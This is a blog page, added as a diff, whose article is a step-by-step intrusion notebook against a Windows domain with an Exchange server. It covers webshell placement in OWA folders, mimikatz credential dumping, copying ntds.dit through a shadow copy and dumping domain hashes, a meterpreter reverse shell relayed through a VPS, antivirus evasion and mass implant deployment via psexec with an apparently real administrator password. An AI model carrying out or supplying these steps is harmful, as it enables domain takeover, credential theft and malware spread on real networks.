@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>windows 2008 domain controllers</title>
+<meta name="description" content="A blog about programming and network security">
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="stylesheet" href="/css/my_code.css">
+<!-- below font-awesome.css can not be replaced by local file,error will occur -->
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+
+<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
+<!-- <script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script> -->
+
+
+
+
+
+
+
+<!-- add zoom.js --> 
+<link href="/css/zoom.css" rel="stylesheet">
+<script src="/js/jquery-1.11.0.min.js"></script>
+<script src="/js/zoom.js"></script>
+<script src="/js/transition.js"></script>
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>
+
+
+    
+    <center style="margin-top:180%">
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
+    <br>
+    <br>
+    </center>
+    <p class="links">
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
+
+      <h1 class="header" itemprop="name">windows 2008 domain controllers</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">May 9, 2016</span>
+           under web
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          2 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><h3 id="0x01-upload-backup-webshells">0x01 upload backup webshells</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
+2.webshell in different folder has different privileges
+    https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&gt; whoami ---&gt; iis apppool\defaultapppool
+    https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下(index.html)   iis权限
+    https://xx.oo.xx/owa/auth/some.aspx    C:\inetpub\wwwroot\&gt; whoami ---&gt; nt authority\system
+    https://xx.oo.xx/owa/对应C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\ 目录 system权限
+3.upload a strong webshell but found "/" error
+    aspx大马连接报错"/"解决方法:https://www.asp-muma.com/?post=97
+    my way defferent from uppon one:
+    create a new folder,create a web.config file with below content:
+    --------------------------content------------------------
+    &lt;configuration&gt;
+        &lt;system.web&gt;
+            &lt;customErrors mode="Off"/&gt;
+        &lt;/system.web&gt;
+    &lt;/configuration&gt;
+    --------------------------end of content----------------
+    then upon a strong webshell to my new created folder,found no more error.
+4.different parse 
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\大马.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\一句话.aspx is not ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\一句话.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
+    C:\inetpub\wwwroot\大马.aspx is not ok to parse before my "adding a new web.config" way in upon 3
+    C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
+</code></pre></div></div>
+
+<h3 id="0x02-find-domain-controllers-and-dc-administrator-username--password">0x02 find domain controllers and dc administrator username &amp; password</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://drops.wooyun.org/tips/421 
+    dsquery server(best)
+    nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
+    netdom query fsmo
+
+mimikatz
+    log
+    privilege::debug
+    sekurlsa::logonpasswords
+
+at 23:0 /every:m,t,w,th,f,s,su "d:\1.bat"
+d:\1.bat:
+"C:\recycler\srclog.exe" -w &gt;&gt; "C:\recycler\test.txt"
+</code></pre></div></div>
+
+<h3 id="0x03-get-all-hashs-in-the-domain-controllers-machine">0x03 get all hashs in the domain controllers machine</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>link a:
+    https://drops.wooyun.org/tips/6617
+link b:
+    https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
+*attention*:
+    in link a,the script name to use shadowcopy is vsshadow.exe
+    in link b,the script name to use shadowcopy is vshadow.exe
+I get vshadow.exe from installing https://www.microsoft.com/en-us/download/confirmation.aspx?id=23490,then search vshadow.exe in the system,this is a quick link:
+    https://pan.baidu.com/s/1cMC07W
+there are three files:shadowcopy_ntds.bat,quarkspwdump.exe(v0.2b),vshadow.exe
+step0:
+    upload these three files to target machine's folder,eg. c:\windows\myfolder\
+step1:
+    shadowcopy_ntds.bat c:\windows\ntds\ntds.dit c:\windows\myfolder\ntds.dit
+    (this shadowcopy_ntds.bat is from link b,it can copy any file while the file is being used)
+step2:
+    esentutl /p /o ntds.dit
+step3:
+    QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
+    (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
+    the origin commands from link a is "QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt",which proved wrong with my quarkspwdump.exe file
+</code></pre></div></div>
+
+<h3 id="0x04-get-a-meterpreter-reverse-shell">0x04 get a meterpreter reverse shell</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.found windows firewall is not open on the target,but "in/out rules exists"
+2.found reverse port like 200 can not get it successfully
+3.can not find why the meterpreter shell can not reverse connecting msf successfully
+4.do these to get meterpreter reverse shell
+    target:run reverse_shell.exe(set reverse port to 53)
+    vps:lcx -listen 300 53
+    local pc:msf--&gt;set lport 300--&gt;set rhost vps's ip
+5.found 53 is ok
+6.better to use shellter to supass avkiller
+</code></pre></div></div>
+
+<h3 id="0x05-批量种马">0x05 批量种马</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
+2&gt;msf
+    use exploit/windows/smb/psexec
+    set EXE::Custom /root/桌面/putty.exe
+    set RHOST -&gt; use armitage to choose pc.txt(192.168.11.1,192.168.11.2,etc)
+    exploit
+    [msf seems better than psexec.exe]
+3&gt;empire框架中的new_gpo_immediate_task.py模块
+    http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/
+4&gt;指派登录脚本,关机脚本,启动脚本
+    https://technet.microsoft.com/zh-cn/library/cc731684(v=ws.11).aspx
+    https://social.technet.microsoft.com/Forums/ru-RU/d14a3017-8ad8-4f89-a3ea-7b93fcfa3271?forum=windowsserversystemzhchs
+5&gt;msf生成msi后用组策略管理编辑器添加安装msi的动作,详情如下图
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%89%B9%E9%87%8F%E5%AE%89%E8%A3%85msi.jpg" /></p>
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            doamin controllers, inside network, aspx, exchange server, outlook
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+
+
+<!-- 个人增加织网背景效果 -->
+<!--
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+
+      
+
+
+
+      
+
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-12">
+		  <!--for better experience please install font 文泉驿等宽正黑-->
+Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
+	<SCRIPT language=javascript> 
+	<!-- 
+	function show_date_time(){ 
+		window.setTimeout("show_date_time()", 1000); 
+		BirthDay=new Date("3/7/2016 20:00:00");
+		today=new Date(); 
+		timeold=(today.getTime() - BirthDay.getTime()); 
+		sectimeold=timeold/1000 
+		secondsold=Math.floor(sectimeold); 
+		msPerDay=24*60*60*1000 
+		e_daysold=timeold/msPerDay 
+		daysold=Math.floor(e_daysold); 
+		e_hrsold=(e_daysold-daysold)*24; 
+		hrsold=Math.floor(e_hrsold); 
+		e_minsold=(e_hrsold-hrsold)*60; 
+		minsold=Math.floor((e_hrsold-hrsold)*60); 
+		seconds=Math.floor((e_minsold-minsold)*60); 
+		//times = document.getElementById("times");
+		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
+	} 
+	show_date_time(); 
+	//--> 
+	</SCRIPT>
+  </div>
+</div>
+
+<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
+<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
+<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
+<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
+<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>
+
+
+<script src="/js/jquery-1.11.0.min.js"></script>
+<!--
+<script src="/js/bootstrap.min.js"></script>
+-->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+<!--
+<script type="text/javascript"> 
+$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
+$youziku.draw(); 
+</script>
+-->
+
+
+    </body>
+</html>
